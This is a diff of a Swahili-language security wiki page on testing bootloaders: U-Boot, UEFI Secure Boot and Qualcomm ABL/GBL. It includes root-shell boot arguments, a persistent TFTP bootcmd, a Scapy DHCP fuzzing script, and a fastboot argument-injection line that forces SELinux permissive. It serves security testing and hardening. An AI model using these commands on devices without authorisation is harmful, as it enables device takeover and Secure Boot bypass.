@@ -1,196 +1,195 @@
-# Testing ya Bootloader
+# Upimaji wa Bootloader
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Hatua zifuatazo zinapendekezwa kwa kurekebisha mipangilio ya kuanzisha kifaa na kujaribu bootloader kama vile U-Boot na loaders za daraja la UEFI. Lenga kupata code execution ya mapema, kutathmini ulinzi wa signatures/rollback, na kutumia vibaya njia za recovery au network-boot.
+Hatua zifuatazo zinapendekezwa kwa kurekebisha mipangilio ya kuwasha kifaa na kupima bootloader kama U-Boot na bootloader za aina ya UEFI. Lenga kupata utekelezaji wa msimbo mapema, kutathmini ulinzi wa sahihi/rollback, na kutumia vibaya njia za recovery au network-boot.
 
-Related: MediaTek secure-boot bypass via bl2_ext patching:
+Inahusiana: Bypass ya secure-boot ya MediaTek kupitia patching ya bl2_ext:
 
 {{#ref}}
 android-mediatek-secure-boot-bl2_ext-bypass-el3.md
 {{#endref}}
 
-## Ufanisi wa haraka wa U-Boot na matumizi mabaya ya environment
+## Mafanikio ya haraka ya U-Boot na matumizi mabaya ya mazingira
 
-1. Fikia interpreter shell
-- Wakati wa boot, bonyeza kitufe kinachojulikana cha kusitisha (mara nyingi kitufe chochote, 0, space, au mfuatano maalum wa board) kabla ya `bootcmd` kutekelezwa ili kufungua prompt ya U-Boot.<sup>[[1]](#references)</sup>
+1. Fikia shell ya interpreter
+   - Wakati wa boot, bonyeza kitufe kinachojulikana cha kusitisha (mara nyingi kitufe chochote, 0, space, au mfuatano maalum wa ubao) kabla ya `bootcmd` kutekelezwa ili kufikia prompt ya U-Boot.<sup>[[1]](#references)</sup>
 
-2. Kagua hali ya boot na variables
-- Commands muhimu:
-- `printenv` (toa environment)
-- `bdinfo` (taarifa za board, memory addresses)
-- `help bootm; help booti; help bootz` (njia za kernel boot zinazotumika)
-- `help ext4load; help fatload; help tftpboot` (loaders zinazopatikana)
+2. Kagua hali ya boot na vigezo
+   - Amri muhimu:
+     - `printenv` (onyesha mazingira)
+     - `bdinfo` (maelezo ya ubao, anwani za kumbukumbu)
+     - `help bootm; help booti; help bootz` (mbinu za kuwasha kernel zinazotumika)
+     - `help ext4load; help fatload; help tftpboot` (loaders zinazopatikana)
 
-3. Rekebisha boot arguments ili kupata root shell
-- Ongeza `init=/bin/sh` ili kernel ifungue shell badala ya init ya kawaida:
-```
-# printenv
-# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
-# saveenv
-# boot    # or: run bootcmd
-```
+3. Rekebisha hoja za boot ili kupata shell ya root
+   - Ongeza `init=/bin/sh` ili kernel ifungue shell badala ya init ya kawaida:
+     ```
+     # printenv
+     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
+     # saveenv
+     # boot    # or: run bootcmd
+     ```
 
 4. Netboot kutoka kwenye TFTP server yako
-- Sanidi network na upakue kernel/fit image kutoka LAN:
-```
-# setenv ipaddr 192.168.2.2      # device IP
-# setenv serverip 192.168.2.1    # TFTP server IP
-# saveenv; reset
-# ping ${serverip}
-# tftpboot ${loadaddr} zImage           # kernel
-# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
-# setenv bootargs "${bootargs} init=/bin/sh"
-# booti ${loadaddr} - ${fdt_addr_r}
-```
+   - Sanidi mtandao na upakue kernel/fit image kutoka LAN:
+     ```
+     # setenv ipaddr 192.168.2.2      # device IP
+     # setenv serverip 192.168.2.1    # TFTP server IP
+     # saveenv; reset
+     # ping ${serverip}
+     # tftpboot ${loadaddr} zImage           # kernel
+     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
+     # setenv bootargs "${bootargs} init=/bin/sh"
+     # booti ${loadaddr} - ${fdt_addr_r}
+     ```
 
-5. Dumisha mabadiliko kupitia environment
-- Ikiwa env storage haijalindwa dhidi ya uandishi, unaweza kudumisha udhibiti:
-```
-# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
-# saveenv
-```
-- Kagua variables kama `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` zinazoathiri njia za fallback. Thamani zilizosanidiwa vibaya zinaweza kuruhusu kuvunja boot mara kwa mara na kuingia kwenye shell.
+5. Fanya mabadiliko yadumu kupitia mazingira
+   - Ikiwa hifadhi ya env haijalindwa dhidi ya uandishi, unaweza kudumisha udhibiti:
+     ```
+     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
+     # saveenv
+     ```
+   - Angalia vigezo kama `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` vinavyoathiri njia za fallback. Thamani zisizosanidiwa vizuri zinaweza kuruhusu kuingia shell mara kwa mara.
 
-6. Kagua features za debug/unsafe
-- Tafuta: `bootdelay` > 0, `autoboot` ikiwa imezimwa, `usb start; fatload usb 0:1 ...` bila vikwazo, uwezo wa kutumia `loady`/`loads` kupitia serial, `env import` kutoka media isiyoaminika, na kernels/ramdisks zinazopakiwa bila signature checks.
+6. Angalia vipengele vya debug/visivyo salama
+   - Tafuta: `bootdelay` > 0, `autoboot` ikiwa imezimwa, `usb start; fatload usb 0:1 ...` isiyo na vizuizi, uwezo wa kutumia `loady`/`loads` kupitia serial, `env import` kutoka media isiyoaminika, na kernels/ramdisks zinazopakiwa bila ukaguzi wa saini.
 
-7. Ujaribio wa U-Boot image/verification
-- Ikiwa platform inadai kuwa na secure/verified boot yenye FIT images, jaribu images ambazo hazijasainiwa na zilizobadilishwa:
-```
-# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
-# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
-# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
-```
-- Kutokuwepo kwa `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` au tabia ya zamani ya `verify=n` mara nyingi huruhusu ku-boot payload yoyote.
-- Usikomee kwenye matokeo rahisi ya allow/deny: utafiti wa hivi karibuni wa FIT ulionyesha kuwa verification path yenyewe inaweza kuwa attack surface ya pre-auth. Fanya negative-test ya FIT data iliyohifadhiwa nje (`data-offset`, `data-position`, `data-size`), signed configuration selection, `loadables`, na handling ya overlay / `extra-conf`.
-- Ikiwa una source tree inayolingana, `test/vboot/vboot_test.sh` ni njia ya haraka ya kuiga FIT verification behaviour kwenye U-Boot sandbox kabla ya kugusa hardware halisi.<sup>[[10]](#references)</sup>
+7. Jaribio la picha/uthibitishaji wa U-Boot
+   - Ikiwa jukwaa linadai kuwa na secure/verified boot kwa kutumia picha za FIT, jaribu picha zisizosainiwa na zilizobadilishwa:
+     ```
+     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
+     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
+     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
+     ```
+   - Kukosekana kwa `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` au tabia ya zamani ya `verify=n` mara nyingi huruhusu kuwasha payload yoyote.
+   - Usitosheke na matokeo rahisi ya kuruhusu/kukataa: utafiti wa hivi karibuni kuhusu FIT umeonyesha kuwa njia ya uthibitishaji yenyewe inaweza kuwa attack surface ya pre-auth. Fanya majaribio hasi kwenye data ya FIT iliyohifadhiwa nje (`data-offset`, `data-position`, `data-size`), uteuzi wa configuration iliyosainiwa, `loadables`, na ushughulikiaji wa overlay / `extra-conf`.
+   - Ikiwa una source tree inayolingana, `test/vboot/vboot_test.sh` ni njia ya haraka ya kuiga tabia ya uthibitishaji wa FIT kwenye U-Boot sandbox kabla ya kugusa hardware halisi.<sup>[[10]](#references)</sup>
 
 8. Standard Boot (`bootstd`), `extlinux`, na script bootflows
-- Kwenye U-Boot builds za kisasa, `bootcmd` mara nyingi huwa wrapper ya Standard Boot. Hii inamaanisha kuwa media inayoweza kuandikwa, PXE, au SPI flash inaweza kuwa trust boundary halisi hata environment inayoonekana ikiwa salama.
-- `extlinux` bootmeth hutafuta `extlinux/extlinux.conf` chini ya `/` na `/boot`; script bootmeth hutafuta `boot.scr.uimg` kwanza, kisha `boot.scr`. Kwenye network boot, jina la script linaweza kutoka kwa `boot_script_dhcp`.
-- Commands muhimu za triage:
-```
-# bootflow scan -l
-# bootflow list
-# bootflow select 0; bootflow info -d
-# bootmeth list
-# bootmeth order "extlinux script pxe"
-```
-- Abuse cases za kujaribu: USB/SD media inayodhibitiwa na attacker ikiwa mapema kwenye `boot_targets`, `/boot/extlinux/extlinux.conf` inayoweza kuandikwa, TFTP rogue inayotoa `boot.scr`, au script execution inayotumia SPI kupitia `script_offset_f`.
-- Ikiwa platform inategemea FIT verification, hakikisha configurations zimesainiwa kwenye configuration level na si kwa kila image pekee; `required-mode=all` ina nguvu zaidi kuliko kukubali key moja tu kati ya keys zinazohitajika.
+   - Kwenye build za kisasa za U-Boot, `bootcmd` mara nyingi ni wrapper tu ya Standard Boot. Hii inamaanisha media zinazoweza kuandikwa, PXE, au SPI flash zinaweza kuwa trust boundary halisi hata mazingira yanayoonekana yanaonekana salama.
+   - `extlinux` bootmeth hutafuta `extlinux/extlinux.conf` chini ya `/` na `/boot`; script bootmeth hutafuta `boot.scr.uimg` kwanza, kisha `boot.scr`. Wakati wa kuwasha kupitia mtandao, jina la script linaweza kutoka kwa `boot_script_dhcp`.
+   - Amri muhimu za triage:
+     ```
+     # bootflow scan -l
+     # bootflow list
+     # bootflow select 0; bootflow info -d
+     # bootmeth list
+     # bootmeth order "extlinux script pxe"
+     ```
+   - Matukio ya matumizi mabaya ya kujaribu: media za USB/SD zinazodhibitiwa na mshambuliaji zilizotangulia kwenye `boot_targets`, ` /boot/extlinux/extlinux.conf` inayoweza kuandikwa, TFTP hasidi inayotoa `boot.scr`, au utekelezaji wa script kupitia SPI kwa kutumia `script_offset_f`.
+   - Ikiwa jukwaa linategemea uthibitishaji wa FIT, hakikisha usanidi umesainiwa katika kiwango cha configuration na si kwa kila image pekee; `required-mode=all` ina usalama zaidi kuliko kukubali key yoyote moja inayohitajika.
 
-## Network-boot surface (DHCP/PXE) na servers rogue
+## Uso wa netboot (DHCP/PXE) na servers hasidi
 
-9. PXE/DHCP parameter fuzzing
-- U-Boot’s legacy BOOTP/DHCP handling imewahi kuwa na memory-safety issues. Kwa mfano, CVE‑2024‑42040 inaeleza memory disclosure kupitia majibu ya DHCP yaliyoundwa mahsusi, yanayoweza kuvuja bytes kutoka U-Boot memory kurudi kwenye network.<sup>[[4]](#references)</sup> Fanya exercise ya DHCP/PXE code paths kwa values ndefu kupita kiasi/za edge-case (option 67 bootfile-name, vendor options, file/servername fields) na angalia hangs/leaks.
-- Scapy snippet ndogo ya ku-stress boot parameters wakati wa netboot:
-```python
-from scapy.all import *
-offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
-IP(src='192.168.2.1', dst='255.255.255.255')/
-UDP(sport=67, dport=68)/
-BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
-DHCP(options=[('message-type','offer'),
-('server_id','192.168.2.1'),
-# Intentionally oversized and strange values
-('bootfile_name','A'*300),
-('vendor_class_id','B'*240),
-'end']))
-sendp(offer, iface='eth0', loop=1, inter=0.2)
-```
-- Pia thibitisha ikiwa PXE filename fields zinapitishwa kwenye shell/loader logic bila sanitization zinapounganishwa na OS-side provisioning scripts.
+9. Fuzzing ya vigezo vya PXE/DHCP
+   - Ushughulikiaji wa zamani wa BOOTP/DHCP wa U-Boot umekuwa na matatizo ya usalama wa kumbukumbu. Kwa mfano, CVE‑2024‑42040 inaeleza ufichuaji wa kumbukumbu kupitia majibu ya DHCP yaliyoundwa mahsusi, yanayoweza kuvuja byte kutoka kwenye kumbukumbu ya U-Boot na kuzituma kupitia mtandao.<sup>[[4]](#references)</sup> Jaribu njia za DHCP/PXE kwa kutumia thamani ndefu kupita kiasi au za hali za mipaka (jina la bootfile la option 67, vendor options, sehemu za file/servername) na uangalie kama mfumo unakwama au data inavuja.
+   - Kipande kifupi cha Scapy cha kusisitiza vigezo vya boot wakati wa netboot:
+     ```python
+     from scapy.all import *
+     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
+              IP(src='192.168.2.1', dst='255.255.255.255')/
+              UDP(sport=67, dport=68)/
+              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
+              DHCP(options=[('message-type','offer'),
+                            ('server_id','192.168.2.1'),
+                            # Intentionally oversized and strange values
+                            ('bootfile_name','A'*300),
+                            ('vendor_class_id','B'*240),
+                            'end']))
+     sendp(offer, iface='eth0', loop=1, inter=0.2)
+     ```
+   - Pia hakikisha kama sehemu za filename za PXE zinapitishwa kwa shell/loader logic bila kusafishwa zinapounganishwa na scripts za provisioning zilizo upande wa OS.
 
-10. Ujaribio wa command injection kupitia rogue DHCP server
-- Sanidi rogue DHCP/PXE service na ujaribu kuingiza characters kwenye filename au options fields ili kufikia command interpreters katika hatua za baadaye za boot chain. Metasploit’s DHCP auxiliary, `dnsmasq`, au custom Scapy scripts zinafaa. Hakikisha unatenga lab network kwanza.
+10. Upimaji wa command injection kupitia seva hasidi ya DHCP
+   - Sanidi huduma hasidi ya DHCP/PXE na ujaribu kuingiza vibambo kwenye sehemu za filename au options ili kufikia interpreters za amri katika hatua za baadaye za mnyororo wa kuwasha. DHCP auxiliary ya Metasploit, `dnsmasq`, au scripts maalum za Scapy zinafaa. Hakikisha umetenga mtandao wa maabara kwanza.
 
-## SoC ROM recovery modes zinazobatilisha boot ya kawaida
+## Njia za urejeshaji za SoC ROM zinazobatilisha kuwasha kwa kawaida
 
-SoC nyingi hutoa BootROM "loader" mode inayokubali code kupitia USB/UART hata flash images zikiwa invalid. Ikiwa secure-boot fuses hazijachomwa, hii inaweza kutoa arbitrary code execution mapema sana kwenye chain.
+SoC nyingi hutoa hali ya "loader" ya BootROM inayopokea code kupitia USB/UART hata kama picha za flash si sahihi. Ikiwa fuse za secure-boot hazijachomwa, hali hii inaweza kutoa utekelezaji wa code ya kiholela mapema sana kwenye mnyororo.
 
 - NXP i.MX (Serial Download Mode)
-- Tools: `uuu` (mfgtools3) au `imx-usb-loader`.
-- Example: `imx-usb-loader u-boot.imx` kusukuma na kuendesha custom U-Boot kutoka RAM.
+  - Zana: `uuu` (mfgtools3) au `imx-usb-loader`.
+  - Mfano: `imx-usb-loader u-boot.imx` ili kutuma na kuendesha U-Boot maalum kutoka RAM.
 - Allwinner (FEL)
-- Tool: `sunxi-fel`.
-- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` au `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
+  - Zana: `sunxi-fel`.
+  - Mfano: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` au `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
 - Rockchip (MaskROM)
-- Tool: `rkdeveloptool`.
-- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` kuweka loader na kupakia custom U-Boot.
+  - Zana: `rkdeveloptool`.
+  - Mfano: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` ili kuweka loader kwenye hatua ya awali na kupakia U-Boot maalum.
 
-Tathmini ikiwa kifaa kina secure-boot eFuses/OTP zilizochomwa. Ikiwa hazipo, BootROM download modes mara nyingi hupita verification yoyote ya kiwango cha juu (U-Boot, kernel, rootfs) kwa kutekeleza first-stage payload yako moja kwa moja kutoka SRAM/DRAM.
+Tathmini kama eFuses/OTP za secure-boot za kifaa zimechomwa. Ikiwa hazijachomwa, hali za upakuaji za BootROM mara nyingi hupita uthibitishaji wowote wa kiwango cha juu (U-Boot, kernel, rootfs) kwa kuendesha payload yako ya hatua ya kwanza moja kwa moja kutoka SRAM/DRAM.
 
-## UEFI/PC-class bootloaders: ukaguzi wa haraka
+## Ukaguzi wa haraka wa bootloaders za UEFI/PC
 
-11. Ujaribio wa ESP tampering, rollback, na key-enrollment
-- Mount EFI System Partition (ESP) na kagua loader components: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
-- Toa hali ya Secure Boot na key databases kutoka OS inapowezekana:
-```bash
-mokutil --sb-state
-efi-readvar -v PK
-efi-readvar -v KEK
-efi-readvar -v db
-efi-readvar -v dbx
-```
-- Ikiwa platform iko kwenye Setup Mode, inakubali key enrollment isiyothibitishwa, au inasafirishwa ikiwa na test/default Platform Key (PKfail class), local admin au physical attacker anaweza ku-enroll KEK/db yake na kuifanya Secure Boot ionekane “enabled” huku aki-boot arbitrary EFI binaries.<sup>[[3]](#references)</sup>
-- Jaribu ku-boot signed boot components zilizodowngrade au zinazojulikana kuwa vulnerable ikiwa Secure Boot revocations (dbx) si za sasa. Ikiwa platform bado inaamini shims/bootmanagers za zamani, mara nyingi unaweza kupakia kernel yako au `grub.cfg` kutoka ESP ili kupata persistence.
+11. Upimaji wa ESP dhidi ya tampering, rollback na uandikishaji wa funguo
+   - Mount EFI System Partition (ESP) na uangalie vipengele vya loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, na paths za nembo za vendor.
+   - Dump hali ya Secure Boot na hifadhidata za funguo kutoka kwenye OS inapowezekana:
+     ```bash
+     mokutil --sb-state
+     efi-readvar -v PK
+     efi-readvar -v KEK
+     efi-readvar -v db
+     efi-readvar -v dbx
+     ```
+   - Ikiwa platform iko katika Setup Mode, inakubali usajili wa funguo bila uthibitishaji, au inasafirishwa ikiwa na Platform Key ya majaribio/chaguomsingi (daraja la PKfail), msimamizi wa ndani au mshambuliaji mwenye ufikiaji wa kimwili anaweza kusajili KEK/db yake na kufanya Secure Boot ionekane “imewezeshwa” huku akiwasha EFI binaries zozote.<sup>[[3]](#references)</sup>
+   - Jaribu kuwasha kwa kutumia vipengele vya kuwasha vilivyotiwa saini vilivyoshushwa toleo au vinavyojulikana kuwa na udhaifu ikiwa revocations za Secure Boot (dbx) hazijasasishwa. Ikiwa platform bado inaziamini shims/bootmanagers za zamani, mara nyingi unaweza kupakia kernel yako au `grub.cfg` yako mwenyewe kutoka ESP ili kupata persistence.
 
-12. Ujaribio wa stale shim / SBAT / dbx revocation
-- Shims za zamani zilizosainiwa na Microsoft na vendor forks bado zinaweza kutumika kama BYOVD-style bootkit path ikiwa revocations ni za zamani. Kwenye lab iliyotengwa, weka shim iliyo historically vulnerable kwenye ESP na ujaribu chainload `grubx64.efi` au kernel yako.<sup>[[11]](#references)</sup>
-- Triage ya haraka:
-```bash
-sbverify --list shimx64.efi
-objdump -s -j .sbat shimx64.efi | less
-efibootmgr -v
-```
-- Ikiwa shim bado ina-run licha ya kuwa kwenye revocation list, firmware/OS ina `dbx` updates za zamani au inaamini forked loader ambayo haikupokea SBAT protections za upstream.
+12. Majaribio ya revocation za shim / SBAT / dbx zilizopitwa na wakati
+   - Shims za zamani zilizosainiwa na Microsoft na forks za vendor bado zinaweza kuwa njia ya BYOVD-style bootkit ikiwa revocations zimepitwa na wakati. Katika lab iliyotengwa, weka shim iliyokuwa na udhaifu kihistoria kwenye ESP na ujaribu ku-chainload `grubx64.efi` au kernel yako mwenyewe.<sup>[[11]](#references)</sup>
+   - Ukaguzi wa haraka:
+     ```bash
+     sbverify --list shimx64.efi
+     objdump -s -j .sbat shimx64.efi | less
+     efibootmgr -v
+     ```
+   - Ikiwa shim bado inaendeshwa licha ya kuwa kwenye orodha ya revocation, firmware/OS ina masasisho ya `dbx` yaliyopitwa na wakati au inaamini loader forked ambayo haijawahi kurithi ulinzi wa SBAT wa upstream.
 
-13. Boot logo parsing bugs (LogoFAIL class)
-- Firmware kadhaa za OEM/IBV zilikuwa vulnerable kwa image-parsing flaws kwenye DXE zinazochakata boot logos. Ikiwa attacker anaweza kuweka image iliyoundwa mahsusi kwenye ESP chini ya vendor-specific path (kwa mfano, `\EFI\<vendor>\logo\*.bmp`) na ku-reboot, code execution wakati wa early boot inaweza kuwezekana hata Secure Boot ikiwa enabled. Jaribu ikiwa platform inakubali logos zinazotolewa na user na ikiwa paths hizo zinaweza kuandikwa kutoka OS.<sup>[[2]](#references)</sup>
+13. Hitilafu za uchanganuzi wa nembo ya boot (darasa la LogoFAIL)
+   - Firmware kadhaa za OEM/IBV zilikuwa na udhaifu wa hitilafu za uchanganuzi wa picha katika DXE inayochakata nembo za boot. Ikiwa mshambulizi anaweza kuweka picha iliyoundwa kwa makusudi kwenye ESP chini ya njia mahususi ya vendor (k.m., `\EFI\<vendor>\logo\*.bmp`) na kuwasha upya kifaa, huenda akaweza kutekeleza msimbo wakati wa hatua za mwanzo za boot hata Secure Boot ikiwa imewashwa. Jaribu ikiwa jukwaa linakubali nembo zilizotolewa na mtumiaji na ikiwa njia hizo zinaweza kuandikiwa kutoka kwa OS.<sup>[[2]](#references)</sup>
 
 
-## Android/Qualcomm ABL + GBL (Android 16) trust gaps
+## Mapengo ya uaminifu ya Android/Qualcomm ABL + GBL (Android 16)
 
-Kwenye vifaa vya Android 16 vinavyotumia Qualcomm's ABL kupakia **Generic Bootloader Library (GBL)**, thibitisha ikiwa ABL **ina-authenticate** UEFI app inayopakia kutoka `efisp` partition. Ikiwa ABL inakagua tu **uwepo** wa UEFI app na haithibitishi signatures, write primitive kwenye `efisp` inakuwa **pre-OS unsigned code execution** wakati wa boot.<sup>[[6]](#references)[[7]](#references)</sup>
+Kwenye vifaa vya Android 16 vinavyotumia ABL ya Qualcomm kupakia **Generic Bootloader Library (GBL)**, hakiki ikiwa ABL **huthibitisha** UEFI app inayopakia kutoka kwenye partition ya `efisp`. Ikiwa ABL hukagua tu **uwepo** wa UEFI app bila kuthibitisha sahihi, uwezo wa kuandika kwenye `efisp` hugeuka kuwa **utekelezaji wa msimbo usiosainiwa kabla ya OS** wakati wa boot.<sup>[[6]](#references)[[7]](#references)</sup>
 
-Ukaguzi wa vitendo na abuse paths:
+Ukaguzi wa vitendo na njia za matumizi mabaya:
 
-- **efisp write primitive**: Unahitaji njia ya kuandika custom UEFI app kwenye `efisp` (root/privileged service, OEM app bug, recovery/fastboot path). Bila hii, GBL loading gap haiwezi kufikiwa moja kwa moja.<sup>[[6]](#references)</sup>
-- **fastboot OEM argument injection** (ABL bug): Baadhi ya builds zinakubali tokens za ziada kwenye `fastboot oem set-gpu-preemption` na kuziongeza kwenye kernel cmdline. Hii inaweza kutumika kulazimisha permissive SELinux, na kuwezesha protected partition writes:
-```bash
-fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
-```
-Ikiwa kifaa kimepatchiwa, command inapaswa kukataa arguments za ziada.<sup>[[5]](#references)[[6]](#references)</sup>
-- **Bootloader unlock kupitia persistent flags**: Payload ya boot-stage inaweza kubadilisha persistent unlock flags (kwa mfano, `is_unlocked=1`, `is_unlocked_critical=1`) ili kuiga `fastboot oem unlock` bila OEM server/approval gates. Hii ni mabadiliko ya kudumu ya posture baada ya reboot inayofuata.<sup>[[6]](#references)</sup>
+- **uwezo wa kuandika kwenye efisp**: Unahitaji njia ya kuandika UEFI app maalum kwenye `efisp` (root/huduma yenye ruhusa za juu, hitilafu kwenye app ya OEM, njia ya recovery/fastboot). Bila hili, pengo la upakiaji wa GBL haliwezi kufikiwa moja kwa moja.<sup>[[6]](#references)</sup>
+- **kuingiza argument za OEM kupitia fastboot** (hitilafu ya ABL): Baadhi ya builds hukubali tokeni za ziada katika `fastboot oem set-gpu-preemption` na kuziongeza kwenye cmdline ya kernel. Hili linaweza kutumiwa kulazimisha SELinux kuruhusu vitendo zaidi, na hivyo kuwezesha uandikaji kwenye partitions zilizolindwa:
+  ```bash
+  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
+  ```
+  Ikiwa kifaa kina viraka, amri inapaswa kukataa hoja za ziada.<sup>[[5]](#references)[[6]](#references)</sup>
+- **Kufungua bootloader kupitia bendera zinazoendelea kuhifadhiwa**: Payload ya hatua ya boot inaweza kubadilisha bendera za kufungua zinazoendelea kuhifadhiwa (k.m., `is_unlocked=1`, `is_unlocked_critical=1`) ili kuiga `fastboot oem unlock` bila vizuizi vya seva/idhini ya OEM. Hali hii hubaki baada ya kuwasha upya.<sup>[[6]](#references)</sup>
 
-Maelezo ya defensive/triage:
+Vidokezo vya ulinzi/triage:
 
-- Thibitisha ikiwa ABL hufanya signature verification kwenye GBL/UEFI payload kutoka `efisp`. Ikiwa haifanyi hivyo, ichukulie `efisp` kama persistence surface yenye risk kubwa.
-- Fuatilia ikiwa ABL fastboot OEM handlers zimepatchiwa **kuthibitisha argument counts** na kukataa tokens za ziada.<sup>[[8]](#references)[[9]](#references)</sup>
+- Thibitisha kama ABL hufanya uthibitishaji wa sahihi kwenye payload ya GBL/UEFI kutoka `efisp`. Ikiwa haifanyi hivyo, ichukulie `efisp` kama sehemu yenye hatari kubwa ya persistence.
+- Fuatilia kama handlers za ABL fastboot OEM zimewekewa viraka ili **kuthibitisha idadi ya hoja** na kukataa tokeni za ziada.<sup>[[8]](#references)[[9]](#references)</sup>
 
-## Tahadhari za hardware
+## Tahadhari ya maunzi
 
-Kuwa mwangalifu unaposhughulika na SPI/NAND flash wakati wa early boot (kwa mfano, ku-ground pins ili kupita reads) na kila mara soma flash datasheet. Short zisizo na wakati sahihi zinaweza kuharibu kifaa au programmer.
+Kuwa mwangalifu unaposhughulikia SPI/NAND flash wakati wa boot ya awali (k.m., kuweka pini ardhini ili kukwepa usomaji) na kila mara rejelea datasheet ya flash. Kufupisha pini kwa wakati usiofaa kunaweza kuharibu kifaa au programmer.
 
-## Notes na vidokezo vya ziada
+## Vidokezo na mbinu za ziada
 
-- Jaribu `env export -t ${loadaddr}` na `env import -t ${loadaddr}` kuhamisha environment blobs kati ya RAM na storage; baadhi ya platforms huruhusu ku-import env kutoka removable media bila authentication.
-- Kwa persistence kwenye Linux-based systems zinazo-boot kupitia `extlinux.conf`, kurekebisha `APPEND` line (kuingiza `init=/bin/sh` au `rd.break`) kwenye boot partition mara nyingi hutosha wakati hakuna signature checks zinazotekelezwa.
-- Ikiwa target inatumia dual-slot / A/B updates, pitia anti-rollback na slot-desync techniques kwenye [firmware analysis overview](README.md) ili usikose trust gaps zinazohusu updater pekee nje ya bootloader yenyewe.
-- Ikiwa userland inatoa `fw_printenv/fw_setenv`, thibitisha kuwa `/etc/fw_env.config` inalingana na env storage halisi. Offsets zilizosanidiwa vibaya hukuruhusu kusoma/kuandika MTD region isiyo sahihi.
+- Jaribu `env export -t ${loadaddr}` na `env import -t ${loadaddr}` ili kuhamisha blob za mazingira kati ya RAM na hifadhi; baadhi ya majukwaa huruhusu kuingiza env kutoka kwenye media inayoweza kutolewa bila uthibitishaji.
+- Kwa persistence kwenye mifumo inayotegemea Linux na kuwasha kupitia `extlinux.conf`, kurekebisha mstari wa `APPEND` (kuingiza `init=/bin/sh` au `rd.break`) kwenye sehemu ya boot mara nyingi hutosha pale ambapo hakuna ukaguzi wa sahihi unaotekelezwa.
+- Ikiwa lengo linatumia masasisho ya dual-slot / A/B, kagua mbinu za anti-rollback na slot-desync katika [muhtasari wa uchanganuzi wa firmware](README.md) ili usikose mapengo ya uaminifu yanayohusu updater pekee nje ya bootloader yenyewe.
+- Ikiwa userland inatoa `fw_printenv/fw_setenv`, thibitisha kuwa `/etc/fw_env.config` inalingana na hifadhi halisi ya env. Offset zilizosanidiwa vibaya zinaweza kukufanya usome/kuandika eneo lisilo sahihi la MTD.
 
 ## References
 
-- [1] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
-- [2] [Finding LogoFAIL: The dangers of image parsing during system boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
-- [3] [PKfail: Untrusted Platform Keys Undermine Secure Boot on UEFI Ecosystem](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
-- [4] [CVE-2024-42040 Detail](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
-- [5] [Preempted: Unlocking Xiaomi via two unsanitized strings](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
-- [6] [Qualcomm Snapdragon 8 Elite GBL exploit lets attackers unlock bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
-- [7] [Generic Bootloader (GBL) architecture](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
-- [8] [QcomModulePkg: Fix propagation of untrusted input into kernel cmdline](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
-- [9] [QcomModulePkg: add check for set-hw-fence-value command](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
-- [10] [Unfit to boot: breaking U-Boot's FIT signature verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
-- [11] [Vulnerability Note VU#616257 - Microsoft-signed UEFI shim bootloaders vulnerable to Secure Boot bypass](https://kb.cert.org/vuls/id/616257)
-
+- [1] [Mbinu ya Kupima Usalama wa Firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
